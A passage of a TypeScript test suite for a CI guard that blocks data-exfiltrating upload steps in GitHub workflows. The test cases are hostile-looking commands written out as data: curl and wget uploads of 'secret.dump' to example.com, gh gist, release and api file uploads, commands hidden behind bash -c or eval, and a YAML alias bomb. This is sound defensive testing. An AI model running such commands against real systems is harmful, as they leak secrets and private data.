import { spawnSync } from "node:child_process";
import { existsSync, mkdtempSync, mkdirSync, renameSync, rmSync, symlinkSync, writeFileSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  ALLOWED_UPLOAD_ARTIFACT_PATHS,
  assertCutoverLogDir,
  assertSafeMigrateLog,
  assertStagedUpload,
  assertWorkflowUploadAllowlist,
  assertWorkflowsUploadAllowlist,
  assertWorkspaceHasNoDataFiles,
  collectSteps,
  collectWorkflowUnits,
  extractUploadArtifactSteps,
  findForbiddenUploadCommands,
  isUnitAllowlisted,
  loadRunAllowlist,
  neededAllowlist,
  neededStepAllowlist,
  findAllowlistOrphans,
  assertAllowlistCoverage,
  YAML_MAX_ALIAS_COUNT,
  listHash,
  unitHash,
  writesGithubEnv,
  writesGithubPath,
  hasReleasePathWrite,
  hasForbiddenEnvAssignment,
  isAtFileToken,
  isDataUrlencodeFileArg,
  isLtFileToken,
  parseWorkflowDocument,
  assertGithubCiLayout,
  listGithubEntries,
  resolveGithubDir,
  allowlistFileName,
  canonicalizeComposite,
  lineLooksLikeCacheSave,
  lineLooksLikeGhApiInput,
  lineLooksLikeHttpUpload,
  logLooksLikeRowData,
  looksLikeDataUpload,
  tokenMentionsTool,
} from "../scripts/guard-public-ci.mjs";

const ROOT = new URL("../", import.meta.url).pathname;
const temps: string[] = [];

afterEach(() => {
  for (const dir of temps.splice(0)) {
    rmSync(dir, { recursive: true, force: true });
  }
});

function tmp() {
  const dir = mkdtempSync(join(tmpdir(), "nuvo-guard-"));
  temps.push(dir);
  return dir;
}

function runYaml(cmd: string) {
  return `run: ${JSON.stringify(cmd)}\n`;
}

/** Mini public workflow so default-deny (full:true) applies. */
function wf(
  steps: string,
  extra: { on?: string; job?: string; jobEnv?: Record<string, string>; runsOn?: string } = {},
) {
  const job = extra.job ?? "t";
  const on = extra.on ?? "push";
  const env = extra.jobEnv
    ? `    env:\n${Object.entries(extra.jobEnv)
        .map(([k, v]) => `      ${k}: ${JSON.stringify(v)}`)
        .join("\n")}\n`
    : "";
  const indented = steps
    .replace(/^\n/, "")
    .split("\n")
    .map((line) => (line.length ? `      ${line}` : line))
    .join("\n");
  return [
    `on: ${on}`,
    "jobs:",
    `  ${job}:`,
    `    runs-on: ${extra.runsOn ?? "ubuntu-latest"}`,
    `${env}    steps:`,
    indented,
    "",
  ].join("\n");
}

const PINNED_PUBLISH = [
  'DMG=$(ls "$BUNDLE"/dmg/*.dmg | head -1)',
  'APPTAR=$(ls "$BUNDLE"/macos/*.app.tar.gz | head -1)',
  'STABLE_DMG="Nuvo.dmg"',
  "NOTES=$(cat RELEASE_NOTES.md)",
];

function releasePublishYaml(createLine: string, assigns: string | string[] = PINNED_PUBLISH) {
  const lines = Array.isArray(assigns) ? assigns : [assigns];
  return ["run: |", ...lines.map((a) => `  ${a}`), `  ${createLine}`, ""].join("\n");
}

const DESKTOP_CREATE =
  'gh release create "$TAG" --repo "$RELEASES_REPO" --title t --notes "$NOTES" --latest "$DMG" "$STABLE_DMG" "$APPTAR" latest.json';

describe("public-repo CI guard", () => {
  it("allowlists only the checksum report", () => {
    expect(ALLOWED_UPLOAD_ARTIFACT_PATHS).toEqual(["artifacts/cutover-report.md"]);
  });

  it("accepts the committed workflows", () => {
    const steps = assertWorkflowsUploadAllowlist(join(ROOT, ".github/workflows"));
    expect(steps).toHaveLength(1);
    expect(steps[0]?.path).toBe("artifacts/cutover-report.md");
    expect(steps[0]?.file).toBe("cutover-migrate.yml");
  });

  it("rejects a dump upload", () => {
    expect(() =>
      assertWorkflowUploadAllowlist(
        "uses: actions/upload-artifact@sha\nwith:\n  path: secret.dump\n",
        "bad.yml",
      ),
    ).toThrow(/secret\.dump/);
  });

  it("rejects quoted uses and upload-artifact/merge", () => {
    expect(() =>
      assertWorkflowUploadAllowlist(
        "uses: 'actions/upload-artifact@sha'\nwith:\n  path: leak.dump\n",
        "quoted.yml",
      ),
    ).toThrow(/leak\.dump/);
    expect(() =>
      assertWorkflowUploadAllowlist(
        'uses: "actions/upload-artifact@sha"\nwith:\n  path: leak.dump\n',
        "dquoted.yml",
      ),
    ).toThrow(/leak\.dump/);
    expect(() =>
      assertWorkflowUploadAllowlist("uses: actions/upload-artifact/merge@sha\n", "merge.yml"),
    ).toThrow(/upload-artifact\/merge/);
    const quotedOk = extractUploadArtifactSteps(
      "uses: 'actions/upload-artifact@sha'\nwith:\n  path: artifacts/cutover-report.md\n",
    );
    expect(quotedOk[0]?.path).toBe("artifacts/cutover-report.md");
    assertWorkflowUploadAllowlist(
      "uses: 'actions/upload-artifact@sha'\nwith:\n  path: artifacts/cutover-report.md\n",
      "ok.yml",
    );
  });

  it("rejects gh release upload and curl/wget upload flags", () => {
    expect(findForbiddenUploadCommands(runYaml("gh release upload v1 secret.dump"))).toEqual([
      { line: 1, kind: "gh release upload" },
    ]);
    expect(lineLooksLikeHttpUpload("curl -T secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --upload-file secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl -F @secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload('curl -F "f=@secret.dump" https://example.com')).toBe(true);
    expect(lineLooksLikeHttpUpload("curl -F 'file=@secret.dump' https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --data @secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --data-raw @secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --data-binary @secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("wget --upload-file=secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("wget --post-file=secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("wget --body-file secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("wget -T 30 https://example.com")).toBe(false);
    expect(() =>
      assertWorkflowUploadAllowlist("run: gh release upload v1 secret.dump\n", "gh.yml"),
    ).toThrow(/gh release upload/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: curl -T secret.dump https://example.com\n", "curl.yml"),
    ).toThrow(/curl\/wget upload/);
    expect(() =>
      assertWorkflowUploadAllowlist('run: curl -F "f=@secret.dump" https://example.com\n', "form.yml"),
    ).toThrow(/curl\/wget upload/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: curl --data @secret.dump https://example.com\n", "data.yml"),
    ).toThrow(/curl\/wget upload/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: curl --data-raw @secret.dump https://example.com\n", "raw.yml"),
    ).toThrow(/curl\/wget upload/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: wget --post-file secret.dump https://example.com\n", "post.yml"),
    ).toThrow(/curl\/wget upload/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: wget --body-file=secret.dump https://example.com\n", "body.yml"),
    ).toThrow(/curl\/wget upload/);
  });

  it("rejects curl -d @file and --data-* @ forms", () => {
    const cmds = [
      "curl -d @file https://example.com",
      'curl -d "@file" https://example.com',
      "curl -d@file https://example.com",
      "curl --data-binary @file https://example.com",
      "curl --data-raw @file https://example.com",
      "curl --data-urlencode @file https://example.com",
      "curl --data-binary=@file https://example.com",
      "curl --data-raw=@file https://example.com",
      "curl --data-urlencode=@file https://example.com",
    ];
    for (const cmd of cmds) {
      expect(lineLooksLikeHttpUpload(cmd), cmd).toBe(true);
      expect(() => assertWorkflowUploadAllowlist(`run: ${cmd}\n`, "d.yml"), cmd).toThrow(
        /curl\/wget upload/,
      );
    }
    expect(isAtFileToken("@file")).toBe(true);
    expect(isAtFileToken("-d@file")).toBe(true);
    expect(isAtFileToken("x=@file")).toBe(true);
    expect(isAtFileToken("user@host")).toBe(false);
    expect(isAtFileToken("postgres@127.0.0.1")).toBe(false);
    expect(isAtFileToken("email=a@b.com")).toBe(false);
    expect(lineLooksLikeHttpUpload("curl -d email=a@b.com https://example.com")).toBe(false);
  });

  it("rejects gh release create files, gist, api @file, and third-party release actions", () => {
    expect(findForbiddenUploadCommands(runYaml("gh release create v1 secret.dump"))).toEqual([
      { line: 1, kind: "gh release create" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh gist create secret.dump"))).toEqual([
      { line: 1, kind: "gh gist create" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh api -F x=@file repos/o/r")).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["gh @file", "gh api field"]),
    );
    expect(findForbiddenUploadCommands(runYaml("gh api -f x=@file repos/o/r")).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["gh @file", "gh api field"]),
    );
    expect(findForbiddenUploadCommands(runYaml('gh api -F "x=@file" repos/o/r')).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["gh @file", "gh api field"]),
    );
    expect(() =>
      assertWorkflowUploadAllowlist(
        "uses: ncipollo/release-action@v1\nwith:\n  artifacts: secret.dump\n",
        "ncipollo.yml",
      ),
    ).toThrow(/ncipollo\/release-action/);
    expect(() =>
      assertWorkflowUploadAllowlist(
        "uses: svenstaro/upload-release-action@v2\nwith:\n  file: secret.dump\n",
        "sven.yml",
      ),
    ).toThrow(/svenstaro\/upload-release-action/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: gh release create v1 secret.dump\n", "create.yml"),
    ).toThrow(/gh release create/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: gh gist create secret.dump\n", "gist.yml"),
    ).toThrow(/gh gist create/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: gh api -F x=@file repos/o/r\n", "field.yml"),
    ).toThrow(/gh @file/);
    const desktopPublish = releasePublishYaml(DESKTOP_CREATE);
    expect(findForbiddenUploadCommands(desktopPublish, "release.yml")).toEqual([]);
    expect(findForbiddenUploadCommands(desktopPublish, "cutover-migrate.yml")).toEqual([
      { line: 5, kind: "gh release create" },
    ]);
    expect(
      findForbiddenUploadCommands(runYaml("gh api repos/o/r --method PUT --field content=$CONTENT")),
    ).toEqual([{ line: 1, kind: "gh api field" }]);
    expect(
      findForbiddenUploadCommands(
        runYaml("gh api repos/o/r --method PUT --field content=$CONTENT"),
        "release.yml",
      ),
    ).toEqual([]);
  });

  it("rejects gh api --input, action-gh-release, and cache save", () => {
    expect(lineLooksLikeGhApiInput("gh api repos/o/r/contents/f --input secret.dump")).toBe(true);
    expect(lineLooksLikeGhApiInput("gh api repos/o/r --method GET")).toBe(false);
    expect(lineLooksLikeCacheSave("uses: actions/cache/save@v4")).toBe(true);
    expect(lineLooksLikeCacheSave("uses: actions/cache@v4")).toBe(true);
    expect(lineLooksLikeCacheSave('uses: "actions/cache@v4"')).toBe(true);
    expect(lineLooksLikeCacheSave("uses: actions/cache/restore@v4")).toBe(false);
    expect(() =>
      assertWorkflowUploadAllowlist("run: gh api repos/o/r/contents/f --input secret.dump\n", "input.yml"),
    ).toThrow(/gh api --input/);
    expect(() =>
      assertWorkflowUploadAllowlist("uses: softprops/action-gh-release@v2\n", "rel.yml"),
    ).toThrow(/softprops\/action-gh-release/);
    expect(() =>
      assertWorkflowUploadAllowlist("uses: actions/cache/save@v4\n", "cachesave.yml"),
    ).toThrow(/actions\/cache\/save/);
    expect(() =>
      assertWorkflowUploadAllowlist("uses: actions/cache@v4\nwith:\n  path: dist\n", "cache.yml"),
    ).toThrow(/actions\/cache save/);
    assertWorkflowUploadAllowlist("uses: actions/cache/restore@v4\n", "cacherestore.yml");
  });

  it("reads uses: from the parsed YAML tree, including flow-map and folded values", () => {
    const flow = [
      "on: push",
      "jobs:",
      "  t:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - { uses: softprops/action-gh-release@v2 }",
      "",
    ].join("\n");
    expect(collectSteps(flow).map((s) => s.uses)).toEqual(["softprops/action-gh-release@v2"]);
    expect(() => assertWorkflowUploadAllowlist(flow, "flow.yml")).toThrow(/softprops\/action-gh-release/);

    const folded = [
      "on: push",
      "jobs:",
      "  t:",
      "    steps:",
      "      - uses: >",
      "          ncipollo/release-action@v1",
      "",
    ].join("\n");
    expect(collectSteps(folded)[0]?.uses).toMatch(/^ncipollo\/release-action@v1/);
    expect(() => assertWorkflowUploadAllowlist(folded, "fold.yml")).toThrow(/ncipollo\/release-action/);

    const literal = [
      "jobs:",
      "  t:",
      "    steps:",
      "      - uses: |",
      "          svenstaro/upload-release-action@v2",
      "",
    ].join("\n");
    expect(() => assertWorkflowUploadAllowlist(literal, "lit.yml")).toThrow(/svenstaro\/upload-release-action/);
  });

  it("rejects curl -F with < file contents", () => {
    expect(isLtFileToken("a=<file")).toBe(true);
    expect(isLtFileToken("-F<file")).toBe(true);
    expect(lineLooksLikeHttpUpload('curl -F "a=<file" https://example.com')).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --form a=<secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl -d a<b https://example.com")).toBe(false);
    expect(() =>
      assertWorkflowUploadAllowlist('run: curl -F "a=<file" https://example.com\n', "lt.yml"),
    ).toThrow(/curl\/wget upload/);
  });

  it("rejects curl --data-urlencode name@file", () => {
    expect(isDataUrlencodeFileArg("name@file")).toBe(true);
    expect(isDataUrlencodeFileArg("@file")).toBe(true);
    expect(isDataUrlencodeFileArg("name=value")).toBe(false);
    expect(lineLooksLikeHttpUpload("curl --data-urlencode name@file https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --data-urlencode=name@secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --data-urlencode name=value https://example.com")).toBe(false);
    expect(() =>
      assertWorkflowUploadAllowlist("run: curl --data-urlencode name@file https://example.com\n", "enc.yml"),
    ).toThrow(/curl\/wget upload/);
  });

  it("detects curl/wget/gh inside command tokens, not just as a bare word", () => {
    expect(tokenMentionsTool("$(which curl)", "curl")).toBe(true);
    expect(tokenMentionsTool("`curl`", "curl")).toBe(true);
    expect(tokenMentionsTool("curl)", "curl")).toBe(true);
    expect(tokenMentionsTool("github", "gh")).toBe(false);
    expect(lineLooksLikeHttpUpload("$(which curl) -d @f https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("`curl` -d @f https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("env curl -d @f https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("command curl -d @f https://example.com")).toBe(true);
    expect(findForbiddenUploadCommands(runYaml("$(which curl) -d @f https://example.com")).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["curl/wget upload", "dirty command"]),
    );
    expect(findForbiddenUploadCommands(runYaml("command gh gist create secret.dump"))).toEqual([
      { line: 1, kind: "gh gist create" },
    ]);
  });

  it("allows gh release create assets only in release.yml with the exact desktop tokens", () => {
    const sneak = "tar czf d.tar.gz dump; gh release create x d.tar.gz";
    expect(findForbiddenUploadCommands(runYaml(sneak), "cutover-migrate.yml")).toEqual([
      { line: 1, kind: "gh release create" },
    ]);
    expect(() => assertWorkflowUploadAllowlist(runYaml(sneak), "cutover-migrate.yml")).toThrow(
      /gh release create/,
    );
    expect(findForbiddenUploadCommands(runYaml("gh release create x $DUMP"), "other.yml")).toEqual([
      { line: 1, kind: "gh release create" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh release create x secret.dump"), "other.yml")).toEqual([
      { line: 1, kind: "gh release create" },
    ]);
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml('gh release create "$TAG" --repo "$RELEASES_REPO" --notes "$NOTES" --latest d.tar.gz'),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("gh release create file");
  });

  it("denies local ./ and docker:// uses unless allowlisted", () => {
    expect(() => assertWorkflowUploadAllowlist("uses: ./local-upload\n", "local.yml")).toThrow(/local uses/);
    expect(() =>
      assertWorkflowUploadAllowlist("uses: docker://ghcr.io/foo/upload:latest\n", "dock.yml"),
    ).toThrow(/docker:\/\/ uses/);
    expect(() =>
      assertWorkflowUploadAllowlist(
        ["on: push", "jobs:", "  t:", "    steps:", "      - { uses: ./evil }", ""].join("\n"),
        "flow-local.yml",
      ),
    ).toThrow(/local uses/);
  });

  it("rejects gh issue/pr --body-file and -F", () => {
    expect(findForbiddenUploadCommands(runYaml("gh issue create --body-file secret.dump"))).toEqual([
      { line: 1, kind: "gh file flag" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh pr create -F secret.dump"))).toEqual([
      { line: 1, kind: "gh file flag" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh issue comment 1 --body-file notes.md"))).toEqual([
      { line: 1, kind: "gh file flag" },
    ]);
    expect(() =>
      assertWorkflowUploadAllowlist(runYaml("gh pr create --body-file dump.csv"), "pr.yml"),
    ).toThrow(/gh file flag/);
    expect(findForbiddenUploadCommands(runYaml("gh pr list"))).toEqual([]);
  });

  it("denies gh release create/edit/upload outside release.yml, and edit/upload inside it", () => {
    expect(findForbiddenUploadCommands(runYaml("gh release create v1 --notes-file secret.dump"), "leak.yml")).toEqual(
      [{ line: 1, kind: "gh release create" }],
    );
    expect(findForbiddenUploadCommands(runYaml("gh release edit v1 --notes-file dump.csv"), "release.yml")).toEqual([
      { line: 1, kind: "gh release edit" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh release upload v1 secret.dump"), "release.yml")).toEqual([
      { line: 1, kind: "gh release upload" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh gist edit id --body-file secret.dump"))).toEqual([
      { line: 1, kind: "gh file flag" },
    ]);
    expect(() =>
      assertWorkflowUploadAllowlist(runYaml("gh release create v1 --notes-file notes.md"), "any.yml"),
    ).toThrow(/gh release create/);
  });

  it("throws on YAML parse errors, multiple documents, and a non-mapping root", () => {
    expect(() => parseWorkflowDocument("uses: [\n")).toThrow(/parse error/);
    expect(() => findForbiddenUploadCommands("uses: [\n")).toThrow(/parse error/);
    expect(() => assertWorkflowUploadAllowlist("---\na: 1\n---\nb: 2\n", "multi.yml")).toThrow(
      /exactly one document/,
    );
    expect(() => parseWorkflowDocument("- uses: softprops/action-gh-release@v2\n")).toThrow(
      /root must be a mapping/,
    );
    expect(() => findForbiddenUploadCommands("gh release upload v1 secret.dump\n")).toThrow(
      /root must be a mapping/,
    );
  });

  it("fails fast on a YAML alias bomb", () => {
    expect(YAML_MAX_ALIAS_COUNT).toBeGreaterThan(0);
    expect(YAML_MAX_ALIAS_COUNT).toBeLessThanOrEqual(100);
    let bomb = "on: push\njobs: {}\na: &a [x, x]\n";
    let prev = "a";
    for (const name of "bcdefghij") {
      bomb += `${name}: &${name} [*${prev}, *${prev}]\n`;
      prev = name;
    }
    expect(() => parseWorkflowDocument(bomb)).toThrow(/alias expansion|resource exhaustion/i);
  });

  it("fails on YAML parser warnings and unknown custom tags", async () => {
    const { parseAllDocuments } = await import("yaml");
    const tagged = "on: !evil push\njobs: {}\n";
    expect(parseAllDocuments(tagged, { uniqueKeys: true })[0]?.warnings?.length).toBeGreaterThan(0);
    expect(() => parseWorkflowDocument(tagged)).toThrow(/custom tag|parse warning/);
    expect(() => parseWorkflowDocument("on: !!python/object foo\njobs: {}\n")).toThrow(/custom tag|parse warning/);
    expect(() => parseWorkflowDocument("x: !foo [1, 2]\njobs: {}\n")).toThrow(/custom tag|parse warning/);
  });

  it("fails on duplicate keys and << merge keys", () => {
    expect(() => parseWorkflowDocument("on: push\non: pull_request\njobs: {}\n")).toThrow(/parse error|unique/);
    expect(() =>
      assertWorkflowUploadAllowlist(
        ["x: &a", "  uses: softprops/action-gh-release@v2", "jobs:", "  t:", "    steps:", "      - <<: *a", ""].join(
          "\n",
        ),
        "merge.yml",
      ),
    ).toThrow(/merge keys/);
  });

  it("rejects interpolated notes, glued -F, two-step assignment, and double --repo", () => {
    expect(
      findForbiddenUploadCommands(runYaml('gh issue create --notes "$(cat dump.sql)"')),
    ).toEqual([{ line: 1, kind: "gh interpolated notes" }]);

    expect(
      findForbiddenUploadCommands(runYaml('X=$(cat dump); gh issue create --notes "$X"')),
    ).toEqual([{ line: 1, kind: "gh interpolated notes" }]);
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(DESKTOP_CREATE.replace('--notes "$NOTES"', '--notes "$X"'), "X=$(cat dump)"),
        "release.yml",
      ).map((h) => h.kind),
    ).toEqual(expect.arrayContaining(["gh release notes", "NOTES assignment"]));

    expect(findForbiddenUploadCommands(runYaml("gh release create v1 -Fdump.sql"), "other.yml")).toEqual([
      { line: 1, kind: "gh release create" },
    ]);
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(
          'gh release create "$TAG" --repo "$RELEASES_REPO" --notes "$NOTES" --latest -Fdump.sql "$DMG" "$STABLE_DMG" "$APPTAR" latest.json',
        ),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("gh release notes");

    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(
          'gh release create "$TAG" --repo "$RELEASES_REPO" --repo x/y --notes "$NOTES" --latest "$DMG" "$STABLE_DMG" "$APPTAR" latest.json',
        ),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("gh release repo");
  });

  it("requires the exact desktop publish shape in release.yml", () => {
    expect(findForbiddenUploadCommands(releasePublishYaml(DESKTOP_CREATE), "release.yml")).toEqual([]);
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(DESKTOP_CREATE, "NOTES=$(cat dump.sql)"),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("NOTES assignment");
  });

  it("rejects interpolated gh api -f/-F/--field/--raw-field values and -F/--input @file", () => {
    const leaks = [
      'gh api repos/o/r -f body="$(cat dump.sql)"',
      "gh api repos/o/r -F body=@dump.sql",
      "gh api repos/o/r --raw-field content=$DUMP",
      "gh api repos/o/r --field=content=$DUMP",
      "gh api repos/o/r -fbody=$DUMP",
      "DUMP=$(cat dump.sql); gh api repos/o/r -f body=$DUMP",
      "gh api repos/o/r --input @dump.sql",
    ];
    for (const cmd of leaks) {
      expect(findForbiddenUploadCommands(runYaml(cmd)).map((h) => h.kind), cmd).toEqual(
        expect.arrayContaining([
          expect.stringMatching(/gh api field|gh api --input|gh @file/),
        ]),
      );
    }
    expect(
      findForbiddenUploadCommands(
        runYaml('gh api repos/o/r --field "content=$CONTENT" --field "sha=$FILE_SHA"'),
        "release.yml",
      ),
    ).toEqual([]);
  });

  it("rejects bash -c, sh -c, any shell -c, and eval that hide gh", () => {
    expect(findForbiddenUploadCommands(runYaml("bash -c 'gh gist create dump.sql'")).map((h) => h.kind)).toContain(
      "shell -c",
    );
    expect(findForbiddenUploadCommands(runYaml('sh -c "gh api -f body=$(cat dump)"')).map((h) => h.kind)).toContain(
      "shell -c",
    );
    expect(findForbiddenUploadCommands(runYaml("zsh -c 'gh release create v1 dump.sql'")).map((h) => h.kind)).toContain(
      "shell -c",
    );
    expect(findForbiddenUploadCommands(runYaml('eval "gh gist create dump.sql"')).map((h) => h.kind)).toContain("eval");
    expect(findForbiddenUploadCommands(runYaml('bash -c "$CMD"')).map((h) => h.kind)).toContain("shell -c");
    expect(findForbiddenUploadCommands(runYaml("bash -c 'echo ok'")).map((h) => h.kind)).not.toContain(
      "step allowlist",
    );
  });

  it("rejects backslashes, quotes, and $ / ${} / $(...) in command position", () => {
    expect(findForbiddenUploadCommands(runYaml("$G gist create dump.sql")).map((h) => h.kind)).toContain(
      "dirty command",
    );
    expect(findForbiddenUploadCommands(runYaml("${G} api -f body=@dump.sql")).map((h) => h.kind)).toContain(
      "dirty command",
    );
    expect(findForbiddenUploadCommands(runYaml("$(which gh) gist create dump.sql")).map((h) => h.kind)).toContain(
      "dirty command",
    );
    expect(findForbiddenUploadCommands(runYaml("\\gh gist create dump.sql")).map((h) => h.kind)).toContain(
      "dirty command",
    );
    expect(findForbiddenUploadCommands(runYaml('"gh" gist create dump.sql')).map((h) => h.kind)).toContain(
      "dirty command",
    );
  });

  it("denies gh alias set and gh alias import everywhere", () => {
    expect(findForbiddenUploadCommands(runYaml("gh alias set leak 'pr create --title t'")).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["gh alias"]),
    );
    expect(findForbiddenUploadCommands(runYaml("gh alias import aliases.yml"), "release.yml").map((h) => h.kind)).toEqual(
      expect.arrayContaining(["gh alias"]),
    );
    expect(() => assertWorkflowUploadAllowlist(runYaml("gh alias set x 'pr create'"), "alias.yml")).toThrow(
      /gh alias/,
    );
  });

  it("pins exactly one DMG/STABLE_DMG/APPTAR/NOTES assignment in the release step", () => {
    expect(findForbiddenUploadCommands(releasePublishYaml(DESKTOP_CREATE), "release.yml")).toEqual([]);
    const reassign = releasePublishYaml(DESKTOP_CREATE, [
      ...PINNED_PUBLISH,
      'DMG=$(ls "$BUNDLE"/dmg/*.dmg | head -1)',
    ]);
    expect(findForbiddenUploadCommands(reassign, "release.yml").map((h) => h.kind)).toContain("DMG assignment");
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(DESKTOP_CREATE, [
          'DMG=/tmp/dump.dmg',
          'APPTAR=$(ls "$BUNDLE"/macos/*.app.tar.gz | head -1)',
          'STABLE_DMG="Nuvo.dmg"',
          "NOTES=$(cat RELEASE_NOTES.md)",
        ]),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("DMG assignment");
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(DESKTOP_CREATE, [
          'DMG=$(ls "$BUNDLE"/dmg/*.dmg | head -1)',
          'APPTAR=$(ls "$BUNDLE"/macos/*.app.tar.gz | head -1)',
          'STABLE_DMG="other.dmg"',
          "NOTES=$(cat RELEASE_NOTES.md)",
        ]),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("STABLE_DMG assignment");
  });

  it("pins yaml at exactly 2.9.1", () => {
    const pkg = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8"));
    expect(pkg.devDependencies.yaml).toBe("2.9.1");
  });

  it("documents Limits: default-deny allowlist and regen script", () => {
    const src = readFileSync(join(ROOT, "scripts/guard-public-ci.mjs"), "utf8");
    expect(src).toMatch(/## Limits/);
    expect(src).toMatch(/actions\/github-script/);
    expect(src).toMatch(/default-deny/);
    expect(src).toMatch(/non-`gh` exfil/);
    expect(src).toMatch(/`nc`/);
    expect(src).toMatch(/Reviewers must read the hashed step/);
    expect(src).toMatch(/regen-public-ci-allowlist/);
    expect(src).toMatch(/guard-public-ci\.allowlist\.json/);
    const doc = readFileSync(join(ROOT, "docs/cloudflare-cutover.md"), "utf8");
    expect(doc).toMatch(/### Limits/);
    expect(doc).toMatch(/actions\/github-script/);
    expect(doc).toMatch(/default-deny/);
    expect(doc).toMatch(/non-`gh` exfil/);
    expect(doc).toMatch(/`nc`/);
    expect(doc).toMatch(/guard-public-ci\.allowlist\.json/);
    expect(doc).toMatch(/regen-public-ci-allowlist/);
    expect(doc).toMatch(/pull_request_target/);
    expect(doc).toMatch(/job minus `steps`/);
    expect(doc).toMatch(/ordered step-id list/);
    expect(src).toMatch(/whole canonical step/);
    expect(src).toMatch(/duplicate step ids/);
    expect(src).toMatch(/YAML_MAX_ALIAS_COUNT/);
    expect(src).toMatch(/assertAllowlistCoverage/);
    expect(existsSync(join(ROOT, "scripts/regen-public-ci-allowlist.mjs"))).toBe(true);
  });

  it("accepts a step only when file + job + id + whole-unit hash match", () => {
    const text = wf("- id: pinned\n  run: echo hi");
    const unit = collectWorkflowUnits(text).units[0];
    expect(unit?.id).toBe("pinned");
    expect(unit?.job).toBe("t");
    const entry = { file: "t.yml", job: "t", id: "pinned", sha256: unitHash(unit) };
    expect(findForbiddenUploadCommands(text, "t.yml", { allowlist: [entry] })).toEqual([]);
    expect(findForbiddenUploadCommands(text, "t.yml", { allowlist: [] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );
    expect(
      findForbiddenUploadCommands(text, "t.yml", {
        allowlist: [{ ...entry, sha256: "0".repeat(64) }],
      }).map((h) => h.kind),
    ).toContain("step allowlist");
    expect(
      findForbiddenUploadCommands(text, "t.yml", { allowlist: [{ ...entry, job: "other" }] }).map((h) => h.kind),
    ).toContain("step allowlist");
    expect(isUnitAllowlisted("t.yml", unit, [entry])).toBe(true);
  });

  it("committed allowlist hashes match every workflow unit", () => {
    const needed = neededAllowlist(join(ROOT, ".github/workflows"));
    const committed = loadRunAllowlist();
    expect(needed.steps.length).toBeGreaterThan(10);
    expect(needed.steps.every((s) => s.file && s.job && s.id && s.sha256)).toBe(true);
    expect(needed.job_steps.every((j) => j.file && j.job && Array.isArray(j.ids) && j.sha256)).toBe(true);
    expect(needed.workflow_jobs.every((w) => w.file && Array.isArray(w.jobs) && w.sha256)).toBe(true);
    expect(committed).toEqual(needed);
    expect(neededStepAllowlist(join(ROOT, ".github/workflows"))).toEqual(needed.steps);
    expect(findAllowlistOrphans(needed, committed)).toEqual([]);
    expect(() => assertAllowlistCoverage(join(ROOT, ".github"))).not.toThrow();
  });

  it("fails when an allowlisted workflow, job, or step is deleted", () => {
    const needed = {
      steps: [{ file: "keep.yml", job: "t", id: "s", sha256: "a" }],
      job_steps: [{ file: "keep.yml", job: "t", ids: ["s"], sha256: "b" }],
      workflow_jobs: [{ file: "keep.yml", jobs: ["t"], sha256: "c" }],
    };
    expect(
      findAllowlistOrphans(needed, {
        steps: [
          ...needed.steps,
          { file: "gone.yml", job: "old", id: "x", sha256: "d" },
        ],
        job_steps: [...needed.job_steps, { file: "keep.yml", job: "removed", ids: ["x"], sha256: "e" }],
        workflow_jobs: [...needed.workflow_jobs, { file: "gone.yml", jobs: ["old"], sha256: "f" }],
      }),
    ).toEqual(["workflow gone.yml", "job keep.yml removed", "step gone.yml old x"]);
  });

  it("100e: env/shell/working-directory edits, copied job BUNDLE override, pull_request_target", () => {
    const release = readFileSync(join(ROOT, ".github/workflows/release.yml"), "utf8");
